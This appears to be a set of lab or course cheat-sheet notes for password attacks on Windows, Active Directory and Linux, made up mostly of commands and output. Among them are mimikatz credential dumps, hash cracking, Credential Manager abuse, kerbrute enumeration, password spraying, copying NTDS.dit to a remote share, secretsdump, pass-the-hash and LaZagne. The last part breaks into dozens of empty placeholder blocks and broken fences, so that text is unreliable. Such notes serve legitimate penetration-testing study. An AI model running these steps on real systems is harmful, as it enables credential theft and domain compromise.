sid S-1-5-21-4019466498-1700476312-3544718034-1001
luid 1354633
	== MSV ==
		Username: bob
		Domain: DESKTOP-33E7O54
		LM: NA
		NT: 64f12cddaa88057e06a81b54e73b949b
		SHA1: cba4e545b7ec918129725154b29f055e4cd5aea8
		DPAPI: NA
```
```
[/htb]$ sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

#### Attacking Windows Credential Manager

```
C:\Users\sadams>rundll32 keymgr.dll,KRShowKeyMgr
```
```
C:\Users\sadams>whoami
srv01\sadams

C:\Users\sadams>cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02hejubrtyqjrkfi
    Local machine persistence

    Target: Domain:interactive=SRV01\mcharles
    Type: Domain Password
    User: SRV01\mcharles
```
```
C:\Users\sadams>runas /savecred /user:SRV01\mcharles cmd
Attempting to start cmd as user "SRV01\mcharles" ...
```
```
C:\Users\Administrator\Desktop> mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman

...SNIP...

Authentication Id : 0 ; 630472 (00000000:00099ec8)
Session           : RemoteInteractive from 3
User Name         : mcharles
Domain            : SRV01
Logon Server      : SRV01
Logon Time        : 4/27/2025 2:40:32 AM
SID               : S-1-5-21-1340203682-1669575078-4153855890-1002
        credman :
         [00000000]
         * Username : mcharles@inlanefreight.local
         * Domain   : onedrive.live.com
         * Password : ...SNIP...

```

#### Attacking Active Directory and NTDS.dit

```
[/htb]$ cat usernames.txt

bwilliamson
benwilliamson
ben.willamson
willamson.ben
bburgerstien
bobburgerstien
bob.burgerstien
burgerstien.bob
jstevenson
jimstevenson
jim.stevenson
stevenson.jim
```
# Useful Code
[username-anarchy](https://github.com/urbanadventurer/username-anarchy)
```
[/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 

ben
benwilliamson
ben.williamson
benwilli
benwill
benw
b.williamson
bwilliamson
wben
w.ben
williamsonb
williamson
williamson.b
williamson.ben
```
# Useful Code
[kerbrute](https://github.com/ropnop/kerbrute)
```
[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop

2025/04/25 09:17:10 >  Using KDC(s):
2025/04/25 09:17:10 >   10.129.201.57:88
```
```
[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```
```
*Evil-WinRM* PS C:\> net localgroup

Aliases for \\DC01

-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Account Operators
*Administrators
*Allowed RODC Password Replication Group
*Backup Operators
*Cert Publishers
*Certificate Service DCOM Access
*Cryptographic Operators
*Denied RODC Password Replication Group
*Distributed COM Users
*DnsAdmins
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Incoming Forest Trust Builders
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Pre-Windows 2000 Compa
```
```
*Evil-WinRM* PS C:\> net user bwilliamson

User name                    bwilliamson
Full Name                    Ben Williamson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/13/2022 12:48:58 PM
Password expires             Never
Password changeable          1/14/20
```
```
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
(C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'C:\'
    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCo
```
```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

        1 file(s) copied.
```
```
*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 

        1 file(s) moved.		
```
```
[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
[*] Reading and decrypting hashes from NTDS.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
krbtgt:502:a
```
```
[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
```
```
[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

#### Credential Hunting in Windows

```
C:\Users\bob\Desktop> start LaZagne.exe all
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|


########## User: bob ##########

------------------- Winscp passwords -----------------

[+] Password found !!!
URL: 10.129.202.51
Login: admin
Password: SteveisReallyC
```

```
C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

#### Linux Authentication Process

```
[/htb]$ head -n 1 /etc/passwd

root::0:0:root:/root:/bin/bash
```
```
[/htb]$ su

root@htb[/htb]#
```
```
ID			Cryptographic Hash Algorithm
1			MD5
2a			Blowfish
5			SHA-256
6			SHA-512
sha1		SHA1crypt
y			Yescrypt
gy			Gost-yescrypt
7			Scrypt
```
```
[/htb]$ sudo cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
```
```
mdmithu@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
mdmithu@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
mdmithu@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes```
```
```
/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
``````
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```
```
a
```

